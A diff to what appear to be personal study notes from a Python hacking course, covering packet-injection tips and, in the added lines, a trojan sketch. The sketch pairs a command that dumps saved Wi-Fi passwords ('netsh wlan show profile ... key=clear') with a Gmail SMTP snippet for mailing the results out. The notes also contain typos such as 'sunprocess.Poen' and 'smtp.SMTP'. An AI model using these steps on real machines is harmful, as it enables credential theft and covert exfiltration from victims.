@@ -412,7 +412,19 @@ if content_len_search:
   need to use packet.show() to troubleshoot in case somethings breaks. but it might end up using HTTP1.1 which sends data in chunks
   and the content length part wont execute as expected. so send the request in HTTP1.0, in req section load = load.replace('HTTP/1.1','HTTP/1.0')
   
-  
+Malware- trojans are evil programs that look like regular programs like pdf or jpeg - sunprocess.Poen does not wait for command to finish.
+command = 'msg * you have been tracked'. As of now keeping .py extension and running with interpreter ie packaging has to be done.
+netsh wlan show profile <wifiname> key=clear . 
+server = smtp.SMTP('smtp.gmail.com',587)
+server.starttls()
+server.login(email,password)
+server.sendmail(email,email,message)
+server.quit()
+
+grep is implemented with command output in a variable and then regex and non-capturing groups and pythex. need to use findall instead
+of search.
+
+
   
                         
          
